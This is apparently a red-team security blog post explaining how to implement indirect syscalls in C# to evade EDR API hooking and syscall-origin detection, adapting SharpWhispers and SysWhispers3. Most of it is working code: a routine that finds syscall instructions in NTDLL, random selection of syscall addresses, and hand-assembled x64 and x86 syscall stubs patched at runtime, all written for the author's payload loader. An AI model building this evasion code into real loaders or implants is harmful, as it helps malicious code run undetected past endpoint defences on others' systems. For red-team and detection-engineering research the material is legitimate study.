# https://www.netero1010-securitylab.com/evasion/indirect-syscall-in-csharp

## [hashtag](https://www.netero1010-securitylab.com/evasion/indirect-syscall-in-csharp\#introduction)    Introduction

While doing CSharp tradecraft development, I was wondering if there is any SysWhispers like implementation in CSharp and I found an excellent project from [SECFORCE arrow-up-right](https://www.secforce.com/) called [SharpWhispersarrow-up-right](https://github.com/SECFORCE/SharpWhispers). This makes my life so much easier by providing functions (SharpASM) to execute assembly and re-implement the " [Sorting by System Call Addressarrow-up-right](https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/)" way to look for syscall number (SSN) like what SysWhispers2 did.

With the increasing use of direct syscall as an evasion technique against EDR API hooking, some detection strategies such as "Mark of the Syscall" signature and execution of syscall instruction originating from outside of NTDLL were developed to identify abnormal syscall usage in both static and dynamic perspective.

Therefore, [KlezVirusarrow-up-right](https://twitter.com/KlezVirus) implemented another solution called [SysWhispers3arrow-up-right](https://github.com/klezVirus/SysWhispers3) to demonstrate indirect syscall technique, which can be used to bypass detection strategies mentioned above.

By implementing indirect syscall, you could enjoy the following benefits:

- Avoid having syscall instruction in your payload

- Ensure the syscall execution is always originated from legitimate NTDLL


In order to provide better evasion capability to my loader, I started implementing indirect syscall in CSharp based on the SharpWhispers and SysWhispers3 implementation and this blog will document the key steps that I did to achieve it.

## [hashtag](https://www.netero1010-securitylab.com/evasion/indirect-syscall-in-csharp\#implementing-indirect-syscall-in-csharp)    Implementing Indirect Syscall in CSharp

Indirect syscall technique aims to replace the original syscall instruction with a jump instruction pointing to a memory address of NTDLL where it stores the syscall instruction.

For instance, the offset 0x12 of each NTDLL API (i.e., NtAllocateVirtualMemory) will generally be the syscall instruction as shown below:

![](https://www.netero1010-securitylab.com/~gitbook/image?url=https%3A%2F%2F3629422832-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fhc07wjSjeLaJUxQVJfIF%252Fuploads%252FY2pcM5ilZRpdC9Nusp93%252Fimage.png%3Falt%3Dmedia%26token%3D6f267522-c841-45ed-b661-bf1a973b078a&width=768&dpr=3&quality=100&sign=d7dc388c&sv=2)

To obtain the syscall address of each NTDLL API, we could walk through the loaded NTDLL in the current process to obtain the address of each NTDLL exported functions and calculate the offset 0x12 and 0x0f respectively to obtain address pointing to the syscall/sysenter (syscall equivalent in 32-bit OS) instruction.

The original SharpWhispers had already did the hard part to locate the export table directory and the relative virtual address of each NTDLL API function. My part will be trying to re-implement the similar function as SysWhispers3 did in CSharp to obtain the address of syscall instruction for each NTDLL APIs.

circle-info

The original SysWhisper3 implementation used a fixed offset to calculate the syscall. However, it could be possible to fail to find the syscall instruction if EDR hooking in installed and it was mentioned in [his blog postarrow-up-right](https://klezvirus.github.io/RedTeaming/AV_Evasion/NoSysWhisper/).

To ensure I always locate the syscall instruction, I included additional search in case the static offset failed to find the syscall instruction by searching byte by byte for syscall instruction that is next to the NTDLL API address.

Copy

```
public static IntPtr SC_Address(IntPtr NtApiAddress)
{
	IntPtr SyscallAddress;

#if WIN64
	byte[] syscall_code =
	{
		0x0f, 0x05, 0xc3
	};

	UInt32 distance_to_syscall = 0x12;

#else
	byte[] syscall_code =
	{
		0x0f, 0x34, 0xc3
	};

	UInt32 distance_to_syscall = 0xf;
#endif

	// Start with common offset to syscall
	var tempSyscallAddress = NtApiAddress.ToInt64() + distance_to_syscall;
	SyscallAddress = (IntPtr) tempSyscallAddress;
	byte[] AddressData = new byte[3];
	Marshal.Copy(SyscallAddress, AddressData, 0, AddressData.Length);
	if (AddressData.SequenceEqual(syscall_code)){
		return SyscallAddress;
	}

	long searchLimit = 512;
	long regionSize = 0;
	long pageAddress = 0;
	long currentAddress = 0;

	// If syscall not found, search the closest one to the current NTDLL API address byte by byte
	PE.MEMORY_BASIC_INFORMATION mem_basic_info = new PE.MEMORY_BASIC_INFORMATION();
	if(Imports.VirtualQueryEx(Imports.GetCurrentProcess(), NtApiAddress, out mem_basic_info, (uint)Marshal.SizeOf(typeof(PE.MEMORY_BASIC_INFORMATION))) != 0)
	{
		regionSize = mem_basic_info.RegionSize.ToInt64();
		pageAddress = (long)mem_basic_info.BaseAddress;
		currentAddress = NtApiAddress.ToInt64();
		searchLimit = regionSize-(currentAddress-pageAddress)-syscall_code.Length+1;
	}

	for (int num_jumps = 1 ; num_jumps < searchLimit ; num_jumps++){
		tempSyscallAddress = NtApiAddress.ToInt64() + num_jumps;
		SyscallAddress = (IntPtr) tempSyscallAddress;
		AddressData = new byte[3];
		Marshal.Copy(SyscallAddress, AddressData, 0, AddressData.Length);
		if (AddressData.SequenceEqual(syscall_code)){
			return SyscallAddress;
		}
	}
	return IntPtr.Zero;
}
```

Then, I edited in the original SYSCALL\_ENTRY object to have additional attribute to store the address of the syscall instruction for each NTDLL API.

In addition, additional check (iswow64()) is added to determine if it is Windows 32-bit on Windows 64-bit (WoW64) and skip the syscall instruction search to minimize overhead to the payload.

Copy

```
public struct SYSCALL_ENTRY
	{
		public string Hash;
		public IntPtr Address;
		public IntPtr SyscallAddress;
	}
...
#if !WIN64
	public static bool iswow64()
	{
		byte[] checkiswow64 =
		{
			0x64, 0xA1, 0xC0, 0x00, 0x00, 0x00,		// mov eax, fs:[0xc0]
			0x85, 0xC0, 							// test eax, eax
			0x75, 0x06,								// jump if wow64
			0xB8, 0x00, 0x00, 0x00, 0x00, 			// mov eax, 0
			0xC3,									// ret
			0xB8, 0x01, 0x00, 0x00, 0x00, 			// mov eax, 1
			0xC3									// ret
		};
		IntPtr iswow64 = SharpASM.callASM(checkiswow64);
		if (iswow64.ToInt64() == 1)
			return true;
		else
			return false;
	}
#endif
...
public static bool PopulateSyscallList(IntPtr moduleBase)
{
...
	// Check if it is wow64
	bool wow64 = System.Environment.Is64BitOperatingSystem && !System.Environment.Is64BitProcess;

	// Check if is a syscall
	if (functionName.StartsWith("Zw"))
	{
		var functionOrdinal = Marshal.ReadInt16((IntPtr)(moduleBase.ToInt64() + ordinalsRva + i * 2)) + ordinalBase;
		var functionRva = Marshal.ReadInt32((IntPtr)(moduleBase.ToInt64() + functionsRva + 4 * (functionOrdinal - ordinalBase)));
		functionPtr = (IntPtr)((long)moduleBase + functionRva);

		Temp_Entry.Hash = HashSyscall(functionName);
		Temp_Entry.Address = functionPtr;
#if WIN64
		Temp_Entry.SyscallAddress = SC_Address(functionPtr);
#else
		// If wow64, skip syscall instruction search
		if (iswow64())
			Temp_Entry.SyscallAddress = IntPtr.Zero;
		else
			Temp_Entry.SyscallAddress = SC_Address(functionPtr);
#endif
		// Add syscall to the list
		SyscallList.Add(Temp_Entry);
	}
...
}
```

Once the syscall list is populated, the GetSyscallAddress function will be used to randomly select a syscall address from the syscall entry list every time I want to execute a syscall.

Copy

```
public static IntPtr GetSyscallAddress(string FunctionHash)
{
	var hModule = GetPebLdrModuleEntry("ntdll.dll");

	if (!PopulateSyscallList(hModule)) return IntPtr.Zero;

	Random rnd = new Random();
	DWORD index = rnd.Next() % SyscallList.Count;
	return SyscallList[index].SyscallAddress;
}
```

Apart from the function to populate list of syscall address for indirect syscall. Updating the syscall stub assembly is also required.

## [hashtag](https://www.netero1010-securitylab.com/evasion/indirect-syscall-in-csharp\#syscall-stub-for-indirect-syscall-in-x64)    Syscall Stub For Indirect Syscall in x64

Unlike the SysWhispers2/3 syscall stub implementation, the CSharp version of syscall stub will not call the getSyscallNumber and getSyscallAddress functions in the assembly code. Instead, these functions will be executed separately and update the stub template afterward. Therefore, there is no need to handle the CPU registers since the stack is not changed.

The updated syscall stub will now assign a randomly generated NTDLL syscall address to R11 followed by a jump instruction to achieve indirect syscall. The x64 syscall stub will be as simple as below:

Copy

```
static byte[] newSyscallStub =
{
	0x4C, 0x8B, 0xD1,               			    // mov r10, rcx
	0xB8, 0x18, 0x00, 0x00, 0x00,    	              	    // mov eax, syscall number
	0x49, 0xBB, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // movabs r11,syscall address
	0x41, 0xFF, 0xE3 				       	    // jmp r11
};
```

## [hashtag](https://www.netero1010-securitylab.com/evasion/indirect-syscall-in-csharp\#syscall-stub-for-indirect-syscall-in-x86)    Syscall Stub For Indirect Syscall in x86

For x86 syscall stub, it will be a little bit more complicated than x64 since the syscall stub needs to be changed to support running syscall on both 32-bit OS and 64-bit OS (wow64).

The original syscall stub from SharpWhispers as shown below supports only x86 execution in 64-bit OS by calling fs:\[C0\] (KiFastSystemCall).

Copy

```
static byte[] originalSyscallStub =
{
            0x55,                                       // push ebp
            0x8B, 0xEC,                                 // mov ebp,esp
            0xB9, 0xAB, 0x00, 0x00, 0x00,               // mov ecx,AB   ; number of parameters
                                                        // push_argument:
            0x49,                                       // dec ecx
            0xFF, 0x74, 0x8D, 0x08,                     // push dword ptr ss:[ebp+ecx*4+8] ; parameter
            0x75, 0xF9,                                 // jne <x86syscallasm.push_argument>
                                                        // ; push ret_address_epilog
            0xE8, 0x00, 0x00, 0x00, 0x00,               // call <x86syscallasm.get_eip> ; get eip with ret-pop
            0x58,                                       // pop eax
            0x83, 0xC0, 0x15,                           // add eax,15   ; Push return address
            0x50,                                       // push eax
            0xB8, 0xCD, 0x00, 0x00, 0x00,               // mov eax,CD ; Syscall number
                                                        // ; Get Address from TIB
            0x64, 0xFF, 0x15, 0xC0, 0x00, 0x00, 0x00,   // call dword ptr fs:[C0] ; call KiFastSystemCall
            0x8D, 0x64, 0x24, 0x04,                     // lea esp,dword ptr ss:[esp+4]
                                                        // ret_address_epilog:
            0x8B, 0xE5,                                 // mov esp,ebp
            0x5D,                                       // pop ebp
            0xC3                                        // ret
};
```

However, the existing stub does not support 32-bit OS since 32-bit OS Windows executes syscall differently. Thus another instruction called "sysenter" will be used, which is an instruction similar to "syscall" for x86 syscall execution. The instruction can be easier inspected from the WinDBG in 32 bit OS.

![](https://www.netero1010-securitylab.com/~gitbook/image?url=https%3A%2F%2F3629422832-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fhc07wjSjeLaJUxQVJfIF%252Fuploads%252FbFDrr9L4JceY9lQBIpJq%252Fimage.png%3Falt%3Dmedia%26token%3Dded3aebd-fd85-468f-8e17-0e133aeb9394&width=768&dpr=3&quality=100&sign=138ac768&sv=2)

In order to support both 32/64 bit OS execution, the syscall stub will be re-structured to first determine if it is wow64 and redirect to proper instructions to execute syscall.

The x86 syscall stub will be separated in few parts. Firstly, the syscall number will be assigned to EAX register.

Copy

```
0xB8, 0xFF, 0x00, 0x00, 0x00,			// mov eax, syscall number
```

Referring to SysWhispers2, a test will be conducted to validate if fs:\[C0\] exists to determine the architecture of the operating system (32/64bit).

Copy

```
0x64, 0x8B, 0x0D, 0xC0, 0x00, 0x00, 0x00, 	// mov ecx, dword ptr fs:[C0]
0x85, 0xC9,					// test ecx, ecx
0x75, 0x0f,					// jne 18 <wow64>
```

The TEB 0xC0 offset will show different result depending on the architecture of the OS.

![](https://www.netero1010-securitylab.com/~gitbook/image?url=https%3A%2F%2F3629422832-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fhc07wjSjeLaJUxQVJfIF%252Fuploads%252F2AsfmdfZHEuvvvzY3MgA%252Fimage.png%3Falt%3Dmedia%26token%3D6044bcb8-23e5-4302-86e8-32b7253fabcb&width=768&dpr=3&quality=100&sign=35734757&sv=2)

x86 process in 64-bit OS

![](https://www.netero1010-securitylab.com/~gitbook/image?url=https%3A%2F%2F3629422832-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fhc07wjSjeLaJUxQVJfIF%252Fuploads%252F1dglrWE9VKS7917s7J4t%252Fimage.png%3Falt%3Dmedia%26token%3D263cfacf-4a04-4afc-843f-b11e6f1e9351&width=768&dpr=3&quality=100&sign=c5c13ab&sv=2)

![](https://www.netero1010-securitylab.com/~gitbook/image?url=https%3A%2F%2F3629422832-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fhc07wjSjeLaJUxQVJfIF%252Fuploads%252FQK8NcHpcI9tnFPOEz5sD%252Fimage.png%3Falt%3Dmedia%26token%3Dc4633b61-8f6e-452e-9622-c17d5464464a&width=768&dpr=3&quality=100&sign=3dfa593e&sv=2)

x86 process in 32-bit OS

If the address is zero, it means the system is running 32-bit OS and it will jump to the instructions that calls sysenter instructions in NTDLL to achieve indirect syscall.

circle-info

In sysenter instruction, EDX will be the user mode return address. Therefore, It is important to assign proper return value (i.e., ESP) to EDX in order to avoid returning execution to unexpected address.

Copy

```
0xE8, 0x01, 0x00, 0x00, 0x00,		// call 1
0xC3,					// ret
0x89, 0xE2,				// mov edx, esp
0xB9, 0xFF, 0xFF, 0xFF, 0xFF,		// mov ecx, syscall address
0xFF, 0xE1,				// jmp ecx
```

At the same time, if it is a x64 system running x86 program, the jump will happen and the next instruction will be calling the KiFastSystemCall function to execute the API call.

Copy

```
																	// wow64
0x64, 0xFF, 0x15, 0xC0, 0x00, 0x00, 0x00,   // call dword ptr fs:[C0] ; call KiFastSystemCall
0xC3 					    // ret
```

The above steps will result in the following syscall stub to support x86 syscall execution for both 32/64bit OS.

Copy

```
static byte[] bSyscallStub =
{
	// assign syscall number for later use
	0xB8, 0xFF, 0x00, 0x00, 0x00,			// mov eax, syscall number

	// validate the architecture of the operating system
	0x64, 0x8B, 0x0D, 0xC0, 0x00, 0x00, 0x00, 	// mov ecx, dword ptr fs:[C0]
	0x85, 0xC9,					// test ecx, ecx
	0x75, 0x0f,					// jne 18 <wow64>
	0xE8, 0x01, 0x00, 0x00, 0x00,			// call 1
	0xC3,						// ret

	// x86 syscall for 32-bit OS
	0x89, 0xE2,					// mov edx, esp
	0xB9, 0xFF, 0xFF, 0xFF, 0xFF,			// mov ecx, syscall address
	0xFF, 0xE1,					// jmp ecx

	// x64 syscall for 64-bit OS									// wow64
	0x64, 0xFF, 0x15, 0xC0, 0x00, 0x00, 0x00,   	// call dword ptr fs:[C0] ; call KiFastSystemCall
	0xC3						// ret
};
```

By including above codes to the SharpWispers, you should be able to execute indirect syscall for both x64/x86 process.

With the syscall number and the syscall address obtained previously, we are now ready to replace them in the corresponding offset of the modified syscall stub template in the DynamicSyscallInvoke function.

Copy

```
int syscallNumber = SyscallSolver.GetSyscallNumber(fHash);
IntPtr syscallAddress = SyscallSolver.GetSyscallAddress(fHash);

#if WIN64
	byte[] syscallNumberByte = BitConverter.GetBytes(syscallNumber);
	syscallNumberByte.CopyTo(bSyscallStub, 4);
	long syscallAddressLong = (long)syscallAddress;
	byte[] syscallAddressByte = BitConverter.GetBytes(syscallAddressLong);
	syscallAddressByte.CopyTo(bSyscallStub, 10);
#else
	byte[] syscallNumberByte = BitConverter.GetBytes(syscallNumber);
	syscallNumberByte.CopyTo(bSyscallStub, 1);
	int syscallAddressInt = (int)syscallAddress;
	byte[] syscallAddressByte = BitConverter.GetBytes(syscallAddressInt);
	syscallAddressByte.CopyTo(bSyscallStub, 25);
#endif
```

Combining all above codes together with SharpWhispers implementation, we are now ready to have a CSharp template that could execute NT API using indirect syscall.

## [hashtag](https://www.netero1010-securitylab.com/evasion/indirect-syscall-in-csharp\#credit)    Credit

All the above implementations cannot be done without the help from their research:

- [@d\_glenxarrow-up-right](https://twitter.com/d_glenx)

- [@KlezVirusarrow-up-right](https://twitter.com/KlezVirus)

- [@s4ntiago\_parrow-up-right](https://twitter.com/s4ntiago_p)


## [hashtag](https://www.netero1010-securitylab.com/evasion/indirect-syscall-in-csharp\#reference)    Reference

[![Logo](https://www.netero1010-securitylab.com/~gitbook/image?url=https%3A%2F%2Fgithub.com%2Ffluidicon.png&width=20&dpr=3&quality=100&sign=da1c54e&sv=2)GitHub - klezVirus/SysWhispers3: SysWhispers on Steroids - AV/EDR evasion via direct system calls.GitHubchevron-right](https://github.com/klezVirus/SysWhispers3)

[![Logo](https://www.netero1010-securitylab.com/~gitbook/image?url=https%3A%2F%2Fgithub.com%2Ffluidicon.png&width=20&dpr=3&quality=100&sign=da1c54e&sv=2)GitHub - SECFORCE/SharpWhispers: C# porting of SysWhispers2. It uses SharpASM to find the code caves for executing the system call stub.GitHubchevron-right](https://github.com/SECFORCE/SharpWhispers)

[![Logo](https://www.netero1010-securitylab.com/~gitbook/image?url=https%3A%2F%2Fgithub.com%2Ffluidicon.png&width=20&dpr=3&quality=100&sign=da1c54e&sv=2)GitHub - Cobalt-Strike/unhook-bof: Remove API hooks from a Beacon process.GitHubchevron-right](https://github.com/Cobalt-Strike/unhook-bof)

[https://klezvirus.github.io/RedTeaming/AV\_Evasion/NoSysWhisper/klezvirus.github.iochevron-right](https://klezvirus.github.io/RedTeaming/AV_Evasion/NoSysWhisper/)

[PreviousAbout Mechevron-left](https://www.netero1010-securitylab.com/) [NextAlternative Process Injectionchevron-right](https://www.netero1010-securitylab.com/evasion/alternative-process-injection)

Last updated 1 year ago